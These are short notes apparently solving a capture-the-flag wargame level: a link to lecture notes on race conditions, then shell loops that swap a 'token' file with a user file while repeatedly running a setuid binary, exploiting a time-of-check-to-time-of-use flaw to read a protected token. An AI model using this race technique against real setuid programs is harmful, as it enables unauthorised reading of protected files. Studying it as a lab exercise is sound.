https://web.ecs.syr.edu/\~wedu/Teaching/IntrCompSec/LectureNotes_New/Race_Condition.pdf


#!/bin/sh

while true
do
	touch file
	./level10 file 0.0.0.0
	if [ $? -eq 0 ]; then
		break;
	else
		rm -rf file
	fi
done


// 
while true; do ./level10 msg 0.0.0.0; done;



#!/bin/sh


while true
do
	mv token tmp
	mv file token
	mv tmp file
done


#!/bin/sh

while true
do
	./level10 file 0.0.0.0
	if [ $? -eq 0 ]; then
		break;
	fi
done